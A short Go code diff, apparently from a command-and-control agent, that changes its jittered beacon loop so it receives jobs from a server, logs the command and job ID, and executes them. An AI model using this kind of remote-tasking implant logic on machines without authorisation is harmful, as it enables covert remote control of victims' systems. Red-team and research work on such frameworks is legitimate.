@@ -27,7 +27,12 @@ func RunLoop(agent *Agent, ctx context.Context, cfg *config.Config) error {
 			continue // Skip to next iteration
 		}
 
-		log.Printf("Response from server: %s", response)
+		if response.Job {
+			log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", response.Command, response.JobID)
+			agent.ExecuteTask(response)
+		} else {
+			log.Printf("No job from Server")
+		}
 
 		// Calculate sleep duration with jitter
 		sleepDuration := CalculateSleepDuration(cfg.Timing.Delay, cfg.Timing.Jitter)
